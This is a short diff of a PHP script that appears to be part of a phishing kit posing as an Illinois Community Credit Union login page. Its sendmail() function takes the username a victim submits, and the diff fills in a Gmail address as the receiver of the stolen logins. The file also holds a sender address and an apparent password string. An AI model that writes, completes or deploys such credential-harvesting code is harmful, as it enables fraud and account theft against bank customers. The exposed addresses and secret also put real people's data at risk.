@@ -29,7 +29,7 @@ $date = date("Y-m-d H:i:s");
 
     function sendmail(){
         $name = "New Login [Illinois Community Credit Union Login]";
-        $to = ""; // Email of the receiver (your email)
+        $to = "gbryyan1@gmail.com"; // Email of the receiver (your email)
         $from = "robertfairweather62@gmail.com"; 
         $passwrd = "1DD8D3551F073E9BCA331E190457F1011BD3";
         $username = $_POST['username'];
